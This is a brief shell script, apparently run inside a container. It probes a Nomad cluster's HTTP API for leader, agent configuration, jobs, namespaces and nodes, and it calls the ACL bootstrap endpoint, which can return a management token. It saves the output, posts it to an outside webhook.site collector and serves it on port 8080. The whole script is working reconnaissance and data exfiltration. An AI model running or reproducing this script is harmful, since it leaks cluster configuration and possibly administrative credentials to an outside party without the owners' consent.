#!/bin/sh
{
N=http://host.containers.internal:4646
echo "==status/leader=="; wget -q -O- "$N/v1/status/leader" 2>&1 | head -c 200; echo
echo "==agent/self=="; wget -q -O- "$N/v1/agent/self" 2>&1 | head -c 1500; echo
echo "==jobs=="; wget -q -O- "$N/v1/jobs" 2>&1 | head -c 2000; echo
echo "==namespaces=="; wget -q -O- "$N/v1/namespaces" 2>&1 | head -c 800; echo
echo "==acl-bootstrap=="; wget -q -O- "$N/v1/acl/bootstrap" 2>&1 | head -c 200; echo
echo "==nodes=="; wget -q -O- "$N/v1/nodes" 2>&1 | head -c 1000; echo
} > /www/index.txt 2>&1
wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr10" >/dev/null 2>&1
httpd -f -p 8080 -h /www
